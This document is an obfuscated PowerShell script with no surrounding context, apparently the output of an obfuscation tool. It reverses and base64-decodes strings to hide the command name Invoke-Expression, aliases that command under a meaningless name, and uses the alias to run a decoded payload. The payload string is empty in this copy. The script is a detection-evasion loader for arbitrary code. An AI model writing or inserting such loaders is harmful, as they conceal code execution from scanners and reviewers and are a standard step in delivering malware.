$alv5t = "" ;
$4HfD0 = $alv5t.ToCharArray() ; [array]::Reverse($4HfD0) ; $VBf95gAeHX0jCNED6TLmI73 = -join $4HfD0 ;
$wsnbMxITtFPHyWq = switch ($VBf95gAeHX0jCNED6TLmI73.Length % 4) { 0 { $VBf95gAeHX0jCNED6TLmI73 }; 1 { $VBf95gAeHX0jCNED6TLmI73.Substring(0, $VBf95gAeHX0jCNED6TLmI73.Length - 1) }; 2 { $VBf95gAeHX0jCNED6TLmI73 + ("=" * 2) }; 3 { $VBf95gAeHX0jCNED6TLmI73 + "=" }} ;
$1apvzCLfiQFgmyAiSLt3b = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($wsnbMxITtFPHyWq)) ;
$9bDiLez35IQZGeDf3rZ = '42TpN1UlJHUYVULlt0TW5Ua'.ToCharArray() ; [array]::Reverse($9bDiLez35IQZGeDf3rZ) ; $wlaI9UAFgU = -join $9bDiLez35IQZGeDf3rZ ;
$wlaI9UAFgU = switch ($wlaI9UAFgU.Length % 4) { 0 { $wlaI9UAFgU }; 1 { $wlaI9UAFgU.Substring(0, $wlaI9UAFgU.Length - 1) }; 2 { $wlaI9UAFgU + '=' * 2 }; 3 { $wlaI9UAFgU + '=' } } ;
$Ai8eLQ07vaUf2lop41O6kx = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($wlaI9UAFgU)) ;
$PQ6cW0xNMBL = 'wNqlDM'.ToCharArray() ; [array]::Reverse($PQ6cW0xNMBL) ; $jyuGBU = -join $PQ6cW0xNMBL ;
$jyuGBU = switch ($jyuGBU.Length % 4) { 0 { $jyuGBU }; 1 { $jyuGBU.Substring(0, $jyuGBU.Length - 1) }; 2 { $jyuGBU + '=' * 2 }; 3 { $jyuGBU + '=' } } ;
$ENWv7Vx6j4A5ArtUKq = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($jyuGBU)) ;
$Null = NeW-Alias -name $ENWv7Vx6j4A5ArtUKq -VAlue $Ai8eLQ07vaUf2lop41O6kx -FoRcE ; & $ENWv7Vx6j4A5ArtUKq $1apvzCLfiQFgmyAiSLt3b ;

